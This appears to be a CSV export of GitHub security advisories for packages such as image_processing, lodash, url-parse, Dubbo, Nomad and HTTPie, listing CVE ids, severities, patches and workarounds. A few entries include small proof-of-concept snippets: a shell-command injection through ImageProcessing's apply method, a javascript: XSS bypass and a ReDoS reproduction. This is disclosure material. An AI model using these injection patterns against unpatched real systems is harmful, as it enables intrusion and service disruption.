2339,27719,image_processing,GHSA-cxf7-qrc5-9446,CVE-2022-24720,https://github.com/advisories/GHSA-cxf7-qrc5-9446,critical,2022-03-01 22:22:26 UTC,Remote shell execution vulnerability in image_processing,"### Impact

When using the `#apply` method from image_processing to apply a series of operations that are coming from unsanitized user input, this allows the attacker to execute shell commands:

```rb
ImageProcessing::Vips.apply({ system: ""echo EXECUTED"" })
#>> EXECUTED
```

This method is called internally by Active Storage variants, so Active Storage is vulnerable as well.

### Patches

The vulnerability has been fixed in version 1.12.2 of image_processing.

### Workarounds

If you're processing based on user input, it's highly recommended that you always sanitize the user input, by allowing only a constrained set of operations. For example:

```rb
operations = params[:operations]
  .map { |operation| [operation[:name], *operation[:value]] }
  .select { |name, *| name.to_s.include? %w[resize_to_limit strip ...] } # sanitization

ImageProcessing::Vips.apply(operations)
```",rubygems
2340,36082,org.alluxio:alluxio-core-common,GHSA-j3ch-vjph-8q6v,CVE-2022-23848,https://github.com/advisories/GHSA-j3ch-vjph-8q6v,critical,2022-02-21 00:00:19 UTC,Command injection in Alluxio,"In Alluxio before 2.7.3, the logserver does not validate the input stream. NOTE: this is not the same as the CVE-2021-44228 Log4j vulnerability.",maven
2341,24191,nomad,GHSA-3382-r9q8-4hfg,CVE-2022-24685,https://github.com/advisories/GHSA-3382-r9q8-4hfg,high,2022-03-01 00:00:28 UTC,Allocation of Resources Without Limits or Throttling in github.com/hashicorp/nomad,"HashiCorp Nomad and Nomad Enterprise 1.x before 1.0.17, 1.1.x before 1.1.12, and 1.2.x before 1.2.6 is vulnerable to Allocation of Resources Without Limits or Throttling.",go
2342,24191,nomad,GHSA-wmrx-57hm-mw7r,CVE-2022-24683,https://github.com/advisories/GHSA-wmrx-57hm-mw7r,high,2022-02-18 00:00:34 UTC,Arbitrary file reads in HashiCorp Nomad,"Nomad is an easy-to-use, flexible, and performant workload orchestrator that can deploy a mix of microservice, batch, containerized, and non-containerized applications. HashiCorp Nomad and Nomad Enterprise 0.9.2 through 1.0.17, 1.1.11, and 1.2.5 allow operators with read-fs and alloc-exec (or job-submit) capabilities to read arbitrary files on the host filesystem as root. There are currently no known workarounds. Users are recommended to upgrade as soon as possible to avoid this issue.",go
2343,24366,coredns,GHSA-gv9j-4w24-q7vx,,https://github.com/advisories/GHSA-gv9j-4w24-q7vx,moderate,2022-03-01 21:03:11 UTC,Improper random number generation in github.com/coredns/coredns,"### Impact

CoreDNS before 1.6.6 (using go DNS package < 1.1.25) improperly generates random numbers because math/rand is used. The TXID becomes predictable, leading to response forgeries.

### Patches
The problem has been fixed in 1.6.6+.

### References
- [CVE-2019-19794](https://nvd.nist.gov/vuln/detail/CVE-2019-19794)

### For more information
Please consult [our security guide](https://github.com/coredns/coredns/blob/master/.github/SECURITY.md) for more information regarding our security process.
",go
2344,20810,apache-airflow,GHSA-3v7g-4pg3-7r6j,CVE-2022-24288,https://github.com/advisories/GHSA-3v7g-4pg3-7r6j,high,2022-02-26 00:00:44 UTC,OS Command injection in Apache Airflow,"In Apache Airflow, prior to version 2.2.4, some example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI.",pip
2345,20810,apache-airflow,GHSA-65xw-pcqw-hjrh,CVE-2021-45229,https://github.com/advisories/GHSA-65xw-pcqw-hjrh,moderate,2022-02-26 00:00:45 UTC,Cross site scripting in apache airflow,"It was discovered that the ""Trigger DAG with config"" screen was susceptible to XSS attacks via the `origin` query argument. This issue affects Apache Airflow versions 2.2.3 and below.",pip
2346,15838,karma,GHSA-rc3x-jf5g-xvc5,CVE-2021-23495,https://github.com/advisories/GHSA-rc3x-jf5g-xvc5,moderate,2022-02-26 00:00:38 UTC,Open redirect in karma,Karma before 6.3.16 is vulnerable to Open Redirect due to missing validation of the return_url query parameter.,npm
2347,16942,url-parse,GHSA-jf5r-8hm2-f872,CVE-2022-0691,https://github.com/advisories/GHSA-jf5r-8hm2-f872,moderate,2022-02-22 00:00:30 UTC,Incorrect hostname / protocol due to unstripped leading control characters.,"Leading control characters in a URL are not stripped when passed into url-parse. This can cause input URLs to be mistakenly be interpreted as a relative URL without a hostname and protocol, while the WHATWG URL parser will trim control characters and treat it as an absolute URL.

If url-parse is used in security decisions involving the hostname / protocol, and the input URL is used in a client which uses the WHATWG URL parser, the decision may be incorrect.

This can also lead to a cross-site scripting (XSS) vulnerability if url-parse is used to check for the javascript: protocol in URLs. See following example:
`````
const parse = require('url-parse')
const express = require('express')
const app = express()
const port = 3000

url = parse(\""\\bjavascript:alert(1)\"")

console.log(url)

app.get('/', (req, res) => {
 if (url.protocol !== \""javascript:\"") {res.send(\""<a href=\\'\"" + url.href + \""\\'>CLICK ME!</a>\"")}
 })

app.listen(port, () => {
 console.log(`Example app listening on port ${port}`)
 })
`````",npm
2348,17352,plist,GHSA-4cpg-3vgw-4877,CVE-2022-22912,https://github.com/advisories/GHSA-4cpg-3vgw-4877,critical,2022-02-18 00:00:33 UTC,Prototype pollution in Plist before 3.0.5 can cause denial of service,Prototype pollution vulnerability via `.parse()` in Plist allows attackers to cause a Denial of Service (DoS) and may lead to remote code execution.,npm
2349,19430,solidus_core,GHSA-5629-8855-gf4g,,https://github.com/advisories/GHSA-5629-8855-gf4g,critical,2021-11-18 20:12:40 UTC,Authentication Bypass by CSRF Weakness,"### Impact
The actual vulnerability has been discovered on `solidus_auth_devise`. See [GHSA-xm34-v85h-9pg2](https://github.com/solidusio/solidus_auth_devise/security/advisories/GHSA-xm34-v85h-9pg2) for details.

The security advisory here exists to provide an extra layer of security in the form of a monkey patch for users who don't update `solidus_auth_devise`. For this reason, it has been marked as low impact on this end.

### Patches
For extra security, update `solidus_core` to versions `3.1.3`, `3.0.3` or `2.11.12`.

### Workarounds
Look at the workarounds described at [GHSA-xm34-v85h-9pg2](https://github.com/solidusio/solidus_auth_devise/security/advisories/GHSA-xm34-v85h-9pg2).

### References
- [GHSA-xm34-v85h-9pg2](https://github.com/solidusio/solidus_auth_devise/security/advisories/GHSA-xm34-v85h-9pg2).

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [solidus_auth_devise](https://github.com/solidusio/solidus_auth_devise/issues) or a discussion in [solidus](https://github.com/solidusio/solidus/discussions)
* Email us at [security@solidus.io](mailto:security@soliidus.io)
* Contact the core team on [Slack](http://slack.solidus.io/)
",rubygems
2350,19702,commonmarker,GHSA-fmx4-26r3-wxpf,,https://github.com/advisories/GHSA-fmx4-26r3-wxpf,high,2022-03-03 20:28:47 UTC,Integer overflow in cmark-gfm table parsing extension leads to heap memory corruption,"### Impact

CommonMarker uses `cmark-gfm` for rendering [Github Flavored Markdown](https://github.github.com/gfm/). An [integer overflow in `cmark-gfm`'s table row parsing](https://github.com/github/cmark-gfm/security/advisories/GHSA-mc3g-88wq-6f4x) may lead to heap memory corruption when parsing tables who's marker rows contain more than UINT16_MAX columns. The impact of this heap corruption ranges from Information Leak to Arbitrary Code Execution.

If affected versions of CommonMarker are used for rendering remote user controlled markdown, this vulnerability may lead to Remote Code Execution (RCE).

### Patches

This vulnerability has been patched in the following CommonMarker release:

- v0.23.4

### Workarounds

The vulnerability exists in the table markdown extensions of `cmark-gfm`. Disabling any use of the table extension will prevent this vulnerability from being triggered.

### References

- https://github.com/github/cmark-gfm/security/advisories/GHSA-mc3g-88wq-6f4x

### Acknowledgements

We would like to thank Felix Wilhelm of Google's Project Zero for reporting this vulnerability

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [CommonMarker](http://github.com/gjtorikian/commonmarker)",rubygems
2351,17237,urijs,GHSA-gmv4-r438-p67f,CVE-2022-24723,https://github.com/advisories/GHSA-gmv4-r438-p67f,moderate,2022-03-03 19:23:36 UTC,Leading white space bypasses protocol validation,"### Impact
Whitespace characters are not removed from the beginning of the protocol, so URLs are not parsed properly and protocol validation mechanisms may fail.

### Patches
Patched in 1.19.9

### Workarounds
Remove leading whitespace from values before passing them to URI.parse (e.g. via `.href(value)` or `new URI(value)`), e.g. by using

```js
function remove_whitespace(url){
     const whitespace = /^[\x00-\x20\u00a0\u1680\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]+/;
     url = url.replace(whitespace, '')
     return url
}
```

### References
* https://huntr.dev/bounties/82ef23b8-7025-49c9-b5fc-1bb9885788e5/

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [medialize/URI.js](https://github.com/medialize/URI.js/)
",npm
2352,23183,containerd,GHSA-crp2-qrr5-8pq7,CVE-2022-23648,https://github.com/advisories/GHSA-crp2-qrr5-8pq7,high,2022-03-02 21:33:17 UTC,containerd CRI plugin: Insecure handling of image volumes,"### Impact

A bug was found in containerd where containers launched through containerd’s CRI implementation with a specially-crafted image configuration could gain access to read-only copies of arbitrary files and directories on the host.  This may bypass any policy-based enforcement on container setup (including a Kubernetes Pod Security Policy) and expose potentially sensitive information.  Kubernetes and crictl can both be configured to use containerd’s CRI implementation.

### Patches

This bug has been fixed in containerd 1.6.1, 1.5.10 and 1.4.13.  Users should update to these versions to resolve the issue.

### Workarounds

Ensure that only trusted images are used.

### Credits

The containerd project would like to thank Felix Wilhelm of Google Project Zero for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)
* Email us at [security@containerd.io](mailto:security@containerd.io)",go
2353,27640,activestorage,GHSA-w749-p3v6-hccq,CVE-2022-21831,https://github.com/advisories/GHSA-w749-p3v6-hccq,critical,2022-03-08 21:25:54 UTC,Possible code injection vulnerability in Rails / Active Storage,"The Active Storage module of Rails starting with version 5.2.0 is possibly vulnerable to code injection. This issue was patched in versions 5.2.6.3, 6.0.4.7, 6.1.4.7, and 7.0.2.3. To work around this issue, applications should implement a strict allow-list on accepted transformation methods or arguments.  Additionally, a strict ImageMagick security policy will help mitigate this issue.",rubygems
2354,20491,httpie,GHSA-9w4w-cpc8-h2fq,CVE-2022-24737,https://github.com/advisories/GHSA-9w4w-cpc8-h2fq,moderate,2022-03-07 23:44:28 UTC,Exposure of Sensitive Information to an Unauthorized Actor in httpie,"### Impact
HTTPie have the practical concept of [sessions](https://httpie.io/docs/cli/sessions), which help users to persistently store some of the state that belongs to the outgoing requests and incoming responses on the disk for further usage. As an example, we can make an authenticated request and save it to a [named session](https://httpie.io/docs/cli/named-sessions) called `api`:

```bash
$ http --session api -a user:pass pie.dev/basic-auth/user/pass
```

```json
{
    ""authenticated"": true,
    ""user"": ""user""
}
```

Since we have now saved the authentication data to that session, we won‘t have to enter it again and again on every invocation. We can simply reference the session, and HTTPie will use the saved state directly from it:

```bash
$ http --session api pie.dev/basic-auth/user/pass
```

```json
{
    ""authenticated"": true,
    ""user"": ""user""
}
```

One particular use case of these sessions is storing cookies (commonly referred to as a `Cookie Jar`). If a response has a `Set-Cookie`
header, HTTPie will parse it and store the actual cookie in the session. And from that point on, all outgoing requests will attach that cookie (in the form of a `Cookie` header).

This is extremely useful, especially when you are dealing with websites which manage their own state on the client-side through cookies.

```bash
$ http -F --session jar pie.dev/cookies/set/x/y
```

```json
{
    ""cookies"": {
        ""x"": ""y""
    }
}
```

Before `3.1.0`, HTTPie didn‘t distinguish between cookies and hosts they belonged. This behavior resulted in the exposure of some cookies when there are redirects originating from the actual host to a third party website, e.g:

```bash
$ http -F --session jar pie.dev/redirect-to url==https://httpbin.org/cookies
```

(Pre 3.1.0)
```json
{
    ""cookies"": {
        ""x"": ""y""
    }
}
```

(Post 3.1.0)
```json
{
    ""cookies"": {}
}
```

This behavior has been corrected in this release (with taking [RFC 6265 — HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/rfc6265) into the consideration).

A huge credit goes to [@Glyph](https://github.com/glyph) for disclosing the original vulnerability to us (through [huntr.dev](http://huntr.dev/)).

### Patches
We suggest users to upgrade their HTTPie version to `3.1.0` or higher, and run `httpie cli sessions upgrade` command on their sessions.

### For more information
If you have any questions or comments about this advisory:
* Email us: [`security@httpie.io`](mailto:security@httpie.io)

> Please note that this entry is covered by both [CVE-2022-24737](https://www.cvedetails.com/cve/CVE-2022-24737) and [CVE-2022-0430](https://nvd.nist.gov/vuln/detail/CVE-2022-0430).
",pip
2355,35879,com.drewnoakes:metadata-extractor,GHSA-4v6p-cxf9-98rf,CVE-2022-24614,https://github.com/advisories/GHSA-4v6p-cxf9-98rf,moderate,2022-02-25 00:01:05 UTC,Allocation of Resources Without Limits or Throttling in metadata-extractor,"When reading a specially crafted JPEG file, metadata-extractor up to 2.16.0 can be made to allocate large amounts of memory that finally leads to an out-of-memory error even for very small inputs. This could be used to mount a denial of service attack against services that use metadata-extractor library.",maven
2356,35879,com.drewnoakes:metadata-extractor,GHSA-p5pg-wm9q-8v6r,CVE-2022-24613,https://github.com/advisories/GHSA-p5pg-wm9q-8v6r,moderate,2022-02-25 00:01:05 UTC,Improper Handling of Exceptional Conditions inn metadata-extractor,"metadata-extractor up to 2.16.0 can throw various uncaught exceptions while parsing a specially crafted JPEG file, which could result in an application crash. This could be used to mount a denial of service attack against services that use metadata-extractor library.",maven
2357,17237,urijs,GHSA-8h2f-7jc4-7m3m,CVE-2022-0868,https://github.com/advisories/GHSA-8h2f-7jc4-7m3m,moderate,2022-03-07 00:00:40 UTC,Open Redirect in urijs,urijs prior to version 1.19.10 is vulnerable to open redirect. This is the result of a bypass for the fix to CVE-2022-0613.,npm
2358,34506,org.liquibase:liquibase-core,GHSA-jvfv-hrrc-6q72,CVE-2022-0839,https://github.com/advisories/GHSA-jvfv-hrrc-6q72,critical,2022-03-05 00:00:45 UTC,Improper Restriction of XML External Entity Reference in Liquibase,The XMLChangeLogSAXParser() function in Liquibase prior to version 4.8.0 contains an issue that may lead to to Improper Restriction of XML External Entity Reference.,maven
2359,35313,org.apache.poi:poi-scratchpad,GHSA-mqvp-7rrg-9jxc,CVE-2022-26336,https://github.com/advisories/GHSA-mqvp-7rrg-9jxc,moderate,2022-03-05 00:00:44 UTC,Improper Input Validation and Allocation of Resources Without Limits or Throttling in poi-scratchpad,"A shortcoming in the HMEF package of poi-scratchpad (Apache POI) allows an attacker to cause an Out of Memory exception. This package is used to read TNEF files (Microsoft Outlook and Microsoft Exchange Server). If an application uses poi-scratchpad to parse TNEF files and the application allows untrusted users to supply them, then a carefully crafted file can cause an Out of Memory exception. This issue affects poi-scratchpad version 5.2.0 and prior versions. Users are recommended to upgrade to poi-scratchpad 5.2.1.",maven
2360,34041,org.elasticsearch:elasticsearch,GHSA-pgq6-ccqj-hpqr,CVE-2022-23708,https://github.com/advisories/GHSA-pgq6-ccqj-hpqr,moderate,2022-03-04 00:00:15 UTC,Elasticsearch privilege escalation issue,"A flaw was discovered in Elasticsearch 7.17.0’s upgrade assistant, in which upgrading from version 6.x to 7.x would disable the in-built protections on the security index, allowing authenticated users with “*” index permissions access to this index. Users running a cluster on an affected version that had previously been upgraded from 6.x, should upgrade to 7.17.1. Users that are planning to upgrade from 6.x should not perform an upgrade from 6.x to versions 7.16 through 7.17.0 and should use 7.17.1+ for upgrades from 6.x.",maven
2361,34341,com.hazelcast:hazelcast,GHSA-99wh-973f-779p,CVE-2022-0265,https://github.com/advisories/GHSA-99wh-973f-779p,critical,2022-03-04 00:00:15 UTC,XML External Entity Reference in Hazelcast,"The AbstractXmlConfigRootTagRecognizer() function makes use of SAXParser generated from a SAXParserFactory with no FEATURE_SECURE_PROCESSING set, allowing for XXE attacks.",maven
2362,16587,lodash-es,GHSA-x5rq-j2xg-h7qm,CVE-2019-1010266,https://github.com/advisories/GHSA-x5rq-j2xg-h7qm,moderate,2019-07-19 16:13:07 UTC,Regular Expression Denial of Service (ReDoS) in lodash,"lodash prior to 4.7.11 is affected by: CWE-400: Uncontrolled Resource Consumption. The impact is: Denial of service. The component is: Date handler. The attack vector is: Attacker provides very long strings, which the library attempts to match using a regular expression. The fixed version is: 4.7.11.",npm
2363,19844,Pillow,GHSA-4fx9-vc88-q2xc,,https://github.com/advisories/GHSA-4fx9-vc88-q2xc,low,2022-03-11 23:39:27 UTC,Infinite loop in Pillow,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",pip
2364,19844,Pillow,GHSA-9j59-75qj-795w,CVE-2022-24303,https://github.com/advisories/GHSA-9j59-75qj-795w,critical,2022-03-11 23:10:32 UTC,Path traversal in Pillow,"If the path to the temporary directory on Linux or macOS contained a space, this would break removal of the temporary image file after im.show() (and related actions), and potentially remove an unrelated file. This been present since PIL.",pip
2365,22126,docker,GHSA-vj3f-3286-r4pf,CVE-2014-9356,https://github.com/advisories/GHSA-vj3f-3286-r4pf,high,2021-05-18 21:09:17 UTC,Path Traversal in Docker,Path traversal vulnerability in Docker before 1.3.3 allows remote attackers to write to arbitrary files and bypass a container protection mechanism via a full pathname in a symlink in an (1) image or (2) build in a Dockerfile.,go
2366,16587,lodash-es,GHSA-p6mc-m468-83gw,CVE-2020-8203,https://github.com/advisories/GHSA-p6mc-m468-83gw,high,2020-07-15 19:15:48 UTC,Prototype Pollution in lodash,"Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The function zipObjectDeep allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays.

This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.",npm
2367,16587,lodash-es,GHSA-35jh-r3h4-6jhm,CVE-2021-23337,https://github.com/advisories/GHSA-35jh-r3h4-6jhm,high,2021-05-06 16:05:51 UTC,Command Injection in lodash,`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.,npm
2368,16587,lodash-es,GHSA-29mw-wpgm-hmr9,CVE-2020-28500,https://github.com/advisories/GHSA-29mw-wpgm-hmr9,moderate,2022-01-06 20:30:46 UTC,Regular Expression Denial of Service (ReDoS) in lodash,"All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions. Steps to reproduce (provided by reporter Liyuan Chen): var lo = require('lodash'); function build_blank (n) { var ret = ""1"" for (var i = 0; i < n; i++) { ret += "" "" } return ret + ""1""; } var s = build_blank(50000) var time0 = Date.now(); lo.trim(s) var time_cost0 = Date.now() - time0; console.log(""time_cost0: "" + time_cost0) var time1 = Date.now(); lo.toNumber(s) var time_cost1 = Date.now() - time1; console.log(""time_cost1: "" + time_cost1) var time2 = Date.now(); lo.trimEnd(s) var time_cost2 = Date.now() - time2; console.log(""time_cost2: "" + time_cost2)",npm
2369,13114,RazorEngine,GHSA-ph3v-2hq5-5qfq,CVE-2021-46703,https://github.com/advisories/GHSA-ph3v-2hq5-5qfq,moderate,2022-03-07 00:00:41 UTC,Code injection in RazorEngine,"In the IsolatedRazorEngine component of Antaris RazorEngine through 4.5.1-alpha001, an attacker can execute arbitrary .NET code in a sandboxed environment (if users can externally control template contents). NOTE: This vulnerability only affects products that are no longer supported by the maintainer.",nuget
2370,33120,nats-streaming-server,GHSA-6h3m-36w8-hv68,CVE-2022-26652,https://github.com/advisories/GHSA-6h3m-36w8-hv68,high,2022-03-10 22:07:30 UTC,Arbitrary file write in nats-server,"(This document is canonically: <https://advisories.nats.io/CVE/CVE-2022-26652.txt>)

## Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.

JetStream is the optional RAFT-based resilient persistent feature of NATS.


## Problem Description

The JetStream streams can be backed up and restored via NATS. The backup format is a tar archive file.  Inadequate checks on the filenames within the archive file permit a so-called ""Zip Slip"" attack in the stream restore.

NATS nats-server through 2022-03-09 (fixed in release 2.7.4) did not correctly sanitize elements of the archive file, thus a user of NATS
could cause the NATS server to write arbitrary content to an attacker-controlled filename.


## Affected versions

NATS Server:
 * 2.2.0 up to and including 2.7.3.
   + Introduced with JetStream Restore functionality
 * Fixed with nats-io/nats-server: 2.7.4
 * Docker image:  nats <https://hub.docker.com/_/nats>
 * NB users of OS package files from our releases: a change in goreleaser defaults, discovered late in the release process, moved the install directory from /usr/local/bin to /usr/bin; we are evaluating the correct solution for subsequent releases, but not recutting this release.

NATS Streaming Server
 * 0.15.0 up to and including 0.24.2
 * Fixed with nats-io/nats-streaming-server: 0.24.3
 * Embeds a nats-server, but this server is the old approach which JetStream replaces, so unlikely (but not impossible) to be
   configured with JS support


## Workarounds

 * Disable JetStream for untrusted users.
 * If only one NATS account uses JetStream, such that cross-user attacks are not an issue, and any user in that account with access to the JetStream API is fully trusted anyway, then appropriate sandboxing techniques will prevent exploit.
   + Eg, with systemd, the supplied util/nats-server-hardened.service example configuration demonstrates that NATS runs fine as an unprivileged user under ProtectSystem=strict and PrivateTmp=true restrictions; by only opening a ReadWritePaths hole for the JetStream storage area, the impact of this vulnerability is limited.


## Solution

Upgrade the NATS server to at least 2.7.4.

We fully support the util/nats-server-hardened.service configuration for running a NATS server and encourage this approach.


## Credits

This issue was reported (on 2022-03-07) to the NATS Maintainers by
Yiming Xiang, TIANJI LAB of NSFOCUS.  
Thank you / 谢谢你！
",go
2371,22961,go-ethereum,GHSA-pvx3-gm3c-gmpr,CVE-2022-23327,https://github.com/advisories/GHSA-pvx3-gm3c-gmpr,high,2022-03-05 00:00:46 UTC,Denial of Service in Go-Ethereum,"A design flaw in Go-Ethereum 1.10.12 and older versions allows an attacker node to send 5120 future transactions with a high gas price in one message, which can purge all of pending transactions in a victim node's memory pool, causing a denial of service (DoS).",go
2372,22961,go-ethereum,GHSA-vmf7-hmh6-vv57,CVE-2022-23328,https://github.com/advisories/GHSA-vmf7-hmh6-vv57,high,2022-03-05 00:00:46 UTC,Denial of Service in Go-Ethereum,"A design flaw in all versions of Go-Ethereum allows an attacker node to send 5120 pending transactions of a high gas price from one account that all fully spend the full balance of the account to a victim Geth node, which can purge all of pending transactions in a victim node's memory pool and then occupy the memory pool to prevent new transactions from entering the pool, resulting in a denial of service (DoS).",go
2373,16567,simple-git,GHSA-3f95-r44v-8mrg,CVE-2022-24433,https://github.com/advisories/GHSA-3f95-r44v-8mrg,high,2022-03-12 00:00:33 UTC,Command injection in simple-git,"The package simple-git before 3.3.0 is vulnerable to Command Injection via argument injection. When calling the .fetch(remote, branch, handlerFn) function, both the remote and branch parameters are passed to the git fetch subcommand. By injecting some git options, it was possible to get arbitrary command execution.",npm
2374,36377,com.alibaba:dubbo,GHSA-qmfc-6www-fjqw,CVE-2021-30181,https://github.com/advisories/GHSA-qmfc-6www-fjqw,critical,2022-03-18 17:57:04 UTC,Code injection in Apache Dubbo,"Apache Dubbo prior to 2.6.9 and 2.7.10 supports Script routing which will enable a customer to route the request to the right server. These rules are used by the customers when making a request in order to find the right endpoint. When parsing these rules, Dubbo customers use ScriptEngine and run the rule provided by the script which by default may enable executing arbitrary code.",maven
2375,36377,com.alibaba:dubbo,GHSA-5mc7-m686-p6jg,CVE-2021-30179,https://github.com/advisories/GHSA-5mc7-m686-p6jg,critical,2022-03-18 17:57:32 UTC,Deserialization of Untrusted Data in Apache Dubbo,"Apache Dubbo prior to 2.6.9 and 2.7.10 by default supports generic calls to arbitrary methods exposed by provider interfaces. These invocations are handled by the GenericFilter which will find the service and method specified in the first arguments of the invocation and use the Java Reflection API to make the final call. The signature for the $invoke or $invokeAsync methods is Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object; where the first argument is the name of the method to invoke, the second one is an array with the parameter types for the method being invoked and the third one is an array with the actual call arguments. In addition, the caller also needs to set an RPC attachment specifying that the call is a generic call and how to decode the arguments. The possible values are: - true - raw.return - nativejava - bean - protobuf-json An attacker can control this RPC attachment and set it to nativejava to force the java deserialization of the byte array located in the third argument.",maven
2376,36377,com.alibaba:dubbo,GHSA-gw4j-4229-q4px,CVE-2021-25640,https://github.com/advisories/GHSA-gw4j-4229-q4px,moderate,2022-03-18 17:56:45 UTC,Server-Side Request Forgery in Apache Dubbo,"In Apache Dubbo prior to 2.6.9 and 2.7.10, the usage of parseURL method will lead to the bypass of white host check which can cause open redirect or SSRF vulnerability.",maven
2377,36377,com.alibaba:dubbo,GHSA-v2rg-8cwr-75g8,CVE-2021-25641,https://github.com/advisories/GHSA-v2rg-8cwr-75g8,critical,2022-03-18 17:56:08 UTC,Deserializer tampering in Apache Dubbo,"Each Apache Dubbo server will set a serialization id to tell the clients which serialization protocol it is working on. But for Dubbo versions before 2.7.8 or 2.6.9, an attacker can choose which serialization id the Provider will use by tampering with the byte preamble flags, aka, not following the server's instruction. This means that if a weak deserializer such as the Kryo and FST are somehow in code scope (e.g. if Kryo is somehow a part of a dependency), a remote unauthenticated attacker can tell the Provider to use the weak deserializer, and then proceed to exploit it.",maven
2378,22961,go-ethereum,GHSA-vrcc-g6vj-mh5w,CVE-2021-42219,https://github.com/advisories/GHSA-vrcc-g6vj-mh5w,high,2022-03-18 00:01:13 UTC,Denial of service in go-ethereum,Go-Ethereum v1.10.9 was discovered to contain an issue which allows attackers to cause a denial of service (DoS) via sending an excessive amount of messages to a node. This is caused by missing memory in the component /ethash/algorithm.go.,go
2379,20461,distributed,GHSA-j8fq-86c5-5v2r,CVE-2021-42343,https://github.com/advisories/GHSA-j8fq-86c5-5v2r,critical,2021-10-27 18:53:48 UTC,Remote code execution in dask,An issue was discovered in Dask (aka python-dask) through 2021.09.1. Single machine Dask clusters started with dask.distributed.LocalCluster or dask.distributed.Client (which defaults to using LocalCluster) would mistakenly configure their respective Dask workers to listen on external interfaces (typically with a randomly selected high port) rather than only on localhost. A Dask cluster created using this method (when running on a machine that has an applicable port exposed) could be used by a sophisticated attacker to achieve remote code execution.,pip
2380,34041,org.elasticsearch:elasticsearch,GHSA-m6gg-86c6-gfr9,CVE-2022-23710,https://github.com/advisories/GHSA-m6gg-86c6-gfr9,moderate,2022-03-04 00:00:15 UTC,Cross-site Scripting in elasticsearch,A cross-site-scripting (XSS) vulnerability was discovered in the Data Preview Pane (previously known as Index Pattern Preview Pane) which could allow arbitrary JavaScript to be executed in a victim’s browser.,maven
2381,20491,httpie,GHSA-6pc9-xqrg-wfqw,CVE-2022-0430,https://github.com/advisories/GHSA-6pc9-xqrg-wfqw,low,2022-03-16 00:00:47 UTC,Exposure of Sensitive information in httpie,"httpie is a modern, user-friendly command-line HTTP client for the API era. Prior to version 3.1.0, all cookies saved to session storage are supercookies. At this time, there is no known workaround. Users are recommended to update to version 3.1.0.",pip
2382,15918,minimist,GHSA-xvch-5gv4-984h,CVE-2021-44906,https://github.com/advisories/GHSA-xvch-5gv4-984h,critical,2022-03-18 00:01:09 UTC,Prototype Pollution in minimist,"Minimist <=1.2.5 is vulnerable to Prototype Pollution via file index.js, function setKey() (lines 69-95).",npm
2383,17733,sails,GHSA-8v3j-jfg3-v3fv,CVE-2021-44908,https://github.com/advisories/GHSA-8v3j-jfg3-v3fv,critical,2022-03-18 00:01:11 UTC,Prototype Pollution in Sails.js,"Sails.js <= 1.5.2 is vulnerable to Prototype Pollution via controller/load-action-modules.js, function loadActionModules(). A [patch](https://github.com/balderdashy/sails/commit/7c5379a656bb305c958df1dcc2b51a9668830358) is available in the `master` branch of Sails.js's GItHub repository.",npm
2384,22730,fasthttp,GHSA-fx95-883v-4q4h,CVE-2022-21221,https://github.com/advisories/GHSA-fx95-883v-4q4h,high,2022-03-18 00:01:11 UTC,Path traversal in github.com/valyala/fasthttp,"The package github.com/valyala/fasthttp before 1.34.0 is vulnerable to Directory Traversal via the ServeFile function, due to improper sanitization. It is possible to be exploited by using a backslash %5c character in the path. **Note:** This security issue impacts Windows users only.",go
2385,20080,waitress,GHSA-4f7p-27jc-3c36,CVE-2022-24761,https://github.com/advisories/GHSA-4f7p-27jc-3c36,high,2022-03-18 19:00:59 UTC,HTTP Request Smuggling in waitress,"### Impact

When using Waitress behind a proxy that does not properly validate the incoming HTTP request matches the RFC7230 standard, Waitress and the frontend proxy may disagree on where one request starts and where it ends.

This would allow requests to be smuggled via the front-end proxy to waitress and later behavior.

There are two classes of vulnerability that may lead to request smuggling that are addressed by this advisory:

- The use of Python's `int()` to parse strings into integers, leading to `+10` to be parsed as `10`, or `0x01` to be parsed as `1`, where as the standard specifies that the string should contain only digits or hex digits.
- Waitress does not support chunk extensions, however it was discarding them without validating that they did not contain illegal characters

### Patches

This has been fixed in Waitress 2.1.1

### Workarounds

When deploying a proxy in front of waitress, turning on any and all functionality to make sure that the request matches the RFC7230 standard. Certain proxy servers may not have this functionality though and users are encouraged to upgrade to the latest version of waitress instead.

### References

- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [the Github issue tracker](https://github.com/Pylons/waitress/issues) (if not security related/sensitive)
* Email us at [pylons-project-security@googlegroups.com](mailto:pylons-project-security@googlegroups.com) (If security related or sensitive)
",pip
2386,24191,nomad,GHSA-gwmc-6795-qghj,CVE-2022-24686,https://github.com/advisories/GHSA-gwmc-6795-qghj,moderate,2022-02-15 00:02:46 UTC,HashiCorp Nomad Artifact Download Race Condition,"HashiCorp Nomad and Nomad Enterprise 0.3.0 through 1.0.17, 1.1.11, and 1.2.5 artifact download functionality has a race condition such that the Nomad client agent could download the wrong artifact into the wrong destination. This issue is fixed in 1.0.18, 1.1.12, and 1.2.6.",go
2387,35825,org.keycloak:keycloak-core,GHSA-m9cj-v55f-8x26,CVE-2020-27826,https://github.com/advisories/GHSA-m9cj-v55f-8x26,high,2022-03-18 17:55:26 UTC,Authentication Bypass in keycloak,A flaw was found in Keycloak before version 12.0.0 where it is possible to update the user's metadata attributes using Account REST API. This flaw allows an attacker to change its own NameID attribute to impersonate the admin user for any particular application.,maven
